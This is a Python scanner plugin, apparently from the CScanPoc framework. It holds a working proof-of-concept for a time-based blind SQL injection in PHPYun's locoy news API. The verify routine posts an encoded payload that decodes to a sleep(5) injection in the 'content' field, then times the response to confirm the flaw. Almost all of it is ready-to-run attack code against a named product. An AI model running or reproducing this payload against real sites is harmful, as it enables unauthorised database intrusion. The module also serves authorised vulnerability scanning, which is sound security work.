# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import time
from random import randint

class Vuln(ABVuln):
    poc_id = 'd0a619cd-e13e-4eff-9f23-09b0ad794c3d'
    name = 'PHPYun SQL注入漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-07-20'  # 漏洞公布时间
    desc = '''
        PHPYUN无视GPC(可注入全站信息) 180个字符的注入，等于没有限制，什么都能注入出来。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'PHPYun'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '8237829d-8a14-4a27-9b53-6e3ac3b4785c'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            # from:http://www.wooyun.org/bugs/wooyun-2015-0127257
            hh = hackhttp.hackhttp()
            url = self.target + '/api/locoy/index.php?m=news&c=addnews&key=phpyun'
            post = 'title=' + str(randint(1111,9999)) + 'yunxu' + '&content=abc&nid=5671&keyword=xxxxxx'
            startTime = time.time()
            code1, head1, res1, errcode1, _ = hh.http(url, post=post)
            endTime = time.time()
            resTime1 = endTime - startTime
            post1 = 'title=' + str(randint(1111,9999)) + 'yunxu' + '&content=%26%2349%3B%26%2339%3B%26%2342%3B%26%23105%3B%26%2332%3B%26%23102%3B%26%2340%3B%26%2349%3B%26%2361%3B%26%2349%3B%26%2344%3B%26%23115%3B%26%23108%3B%26%23101%3B%26%23101%3B%26%2332%3B%26%23112%3B%26%2340%3B%26%2353%3B%26%2341%3B%26%2344%3B%26%2349%3B%26%2341%3B%26%2335%3B&nid=5671&keyword=xxxxxx'

            startTime2 = time.time()
            code2, head2, res2, errcode2, _= hh.http(url, post=post1)
            endTime2 = time.time()
            resTime2 = endTime2 - startTime2
            if code1 == 200 and code2 == 200 and resTime2 >= 5 and resTime2 > resTime1:
                #security_hole(url + ' :SQL Injection')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))       

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
